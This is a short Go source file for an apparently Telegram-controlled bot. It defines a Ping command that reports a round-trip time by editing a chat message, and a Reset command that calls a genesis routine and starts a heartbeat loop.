package commands

import (
	"fmt"
	"time"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	fmtPing = "Pong!\nRequest took %s"
)

func Ping() {
	back := time.Now()
	cfg := tgbotapi.NewMessage(util.ChatID, "Pong!")
	msg, err := api.Bot.Send(cfg)
	util.Handle(err)
	eCfg := tgbotapi.NewEditMessageText(util.ChatID, msg.MessageID, "")
	eCfg.Text = fmt.Sprintf(fmtPing, time.Since(back))
	_, err = api.Bot.Send(eCfg)
	util.Handle(err)
}

func Reset() {
	api.NewGenesis()
	go api.Heartbeat()
}
